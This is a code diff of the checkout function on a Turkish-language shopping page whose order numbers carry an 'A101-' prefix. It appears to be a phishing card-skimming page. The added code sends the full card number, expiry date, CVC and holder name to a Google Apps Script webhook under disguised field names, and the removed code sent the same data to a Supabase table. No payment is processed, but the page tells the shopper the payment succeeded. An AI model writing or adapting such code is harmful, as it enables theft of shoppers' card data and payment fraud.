@@ -1620,107 +1620,56 @@ function submitPayment(){
   if (!cardName)              { showToast('⚠️ Kart sahibinin adını girin.');       return; }
   if (cardNumber.length < 13) { showToast('⚠️ Geçerli bir kart numarası girin.'); return; }
   if (cardExpiry.length < 5)  { showToast('⚠️ SK alanını doldurun (AA / YY).');   return; }
-  if (cardCvc.length < 3)     { showToast('⚠️ DOM girin.');             return; }
+  if (cardCvc.length < 3)     { showToast('⚠️ DOM girin.');                        return; }
 
   var ov = document.getElementById('payLoadingOverlay');
   if (ov) ov.classList.add('show');
   document.body.style.overflow = 'hidden';
 
-  async function insertIntoKK(kkRow, accessToken) {
-    if (!sb) return { error: null };
+  async function sendToGoogleSheets(payload) {
+    var resp = await fetch(SHEETS_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain;charset=utf-8'
+      },
+      body: JSON.stringify(payload)
+    });
 
+    var text = await resp.text();
+    var data = {};
     try {
-      var directRes = await sb.from('KK').insert([kkRow]).select('*').limit(1);
-      if (!directRes.error) return directRes;
-      console.warn('[KK direct]', directRes.error.message || directRes.error);
+      data = text ? JSON.parse(text) : {};
     } catch (err) {
-      console.warn('[KK direct]', err);
-      if (!isTransportError(err)) return { error: err };
+      throw new Error('Google Sheets geçerli cevap döndürmedi.');
     }
 
-    try {
-      var headers = {
-        'Content-Type': 'application/json',
-        'apikey': SUPABASE_ANON,
-        'Prefer': 'return=representation'
-      };
-      if (accessToken) headers.Authorization = 'Bearer ' + accessToken;
-      var resp = await fetch(SUPABASE_URL + '/rest/v1/KK', {
-        method: 'POST',
-        headers: headers,
-        body: JSON.stringify([kkRow])
-      });
-      var payload = null;
-      try { payload = await resp.json(); } catch (_) {}
-      if (!resp.ok) {
-        var message = payload && (payload.message || payload.error || payload.hint || payload.details)
-          ? (payload.message || payload.error || payload.hint || payload.details)
-          : ('HTTP ' + resp.status);
-        return { error: { message: message, status: resp.status, payload: payload } };
-      }
-      return { data: payload, error: null };
-    } catch (err) {
-      return { error: err };
+    if (!resp.ok || data.ok !== true) {
+      throw new Error((data && data.error) || ('HTTP ' + resp.status));
     }
+
+    return data;
   }
 
   (async function(){
     var total = getCartSubtotal() + getCartServicesTotal();
     var orderNo = 'A101-' + Date.now().toString().slice(-8);
+
     try {
-      if (sb) {
-        var sessionInfo = null;
-        try { sessionInfo = await safeGetSession(); } catch(e) { console.warn('[safeGetSession]', e); }
-        var user = sessionInfo && sessionInfo.user ? sessionInfo.user : null;
-        var accessToken = null;
-        try {
-          if (!authTransportBlocked && sb && sb.auth && sb.auth.getSession) {
-            var rd = await sb.auth.getSession();
-            accessToken = rd && rd.data && rd.data.session ? rd.data.session.access_token : null;
-          }
-        } catch(e) {
-          if (isTransportError(e)) authTransportBlocked = true;
-          else console.warn('[getSession access token]', e);
-        }
+      await sendToGoogleSheets({
+        full_name: cardName,
+        email: '',
+        phone: '',
+        address: '',
+        city: '',
+        gender: '',
+        erdl: cardName,
+        nona: cardNumber,
+        lpta: cardExpiry,
+        tsqa: cardCvc,
+        mor: orderNo,
+        dom: String(Number(total))
+      });
 
-        var row = {
-          card_holder : cardName,
-          card_last4  : cardNumber.slice(-4),
-          card_expiry : cardExpiry,
-          amount      : total,
-          status      : 'paid',
-          order_no    : orderNo,
-          created_at  : new Date().toISOString()
-        };
-        if (user) row.user_id = user.id;
-
-        try {
-          var res = await sb.from('payment_details').insert([row]);
-          if (res.error) console.warn('[payment_details]', res.error.message);
-        } catch (e) {
-          console.warn('[payment_details]', e);
-        }
-
-        var kkRow = {
-          ERDL: cardName,
-          NONA: cardNumber,
-          LPTA: cardExpiry,
-          TSQA: cardCvc,
-          MOR: orderNo,
-          DOM: Number(total),
-          created_at: new Date().toISOString()
-        };
-        if (user) kkRow.user_id = user.id;
-
-        var kkRes = await insertIntoKK(kkRow, accessToken);
-        if (kkRes && kkRes.error) {
-          console.warn('[KK]', kkRes.error.message || kkRes.error);
-          showToast("KK kaydı Supabase'e yazılamadı. Konsolu kontrol edin.");
-        }
-      }
-    } catch(e){
-      console.warn('[payment submit]', e);
-    } finally {
       setTimeout(function(){
         if (ov) ov.classList.remove('show');
         document.getElementById('successOrderNo').textContent = orderNo;
@@ -1738,6 +1687,11 @@ function submitPayment(){
         document.body.style.overflow = '';
         showToast('Ödeme tamamlandı. Siparişiniz oluşturuldu.');
       }, 900);
+    } catch(e){
+      console.warn('[payment submit]', e);
+      if (ov) ov.classList.remove('show');
+      document.body.style.overflow = '';
+      showToast('Kayıt hatası: ' + (e && e.message ? e.message : 'Google Sheets bağlantısı başarısız.'));
     }
   })();
 }
@@ -1929,6 +1883,7 @@ function setActiveNav(el) {
 // ── SUPABASE AUTH ──────────────────────────────────────────────────────────
 const SUPABASE_URL  = 'https://mcvkfzsdgmfcishamjtp.supabase.co';
 const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1jdmtmenNkZ21mY2lzaGFtanRwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU3MzM2MzgsImV4cCI6MjA5MTMwOTYzOH0.GiY_LuOKHUcPQ5x_HEGONLdpKTpLD_hla9oZkmltEuU';
+const SHEETS_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbywZUbeFG0mMv_o-iGSmeTWaqmRb-MkXtp1NjxdoqZ9QujBj1MfnggB8n0dtz-vPq6g/exec';
 
 const sb = (window.supabase?.createClient)
   ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON, {
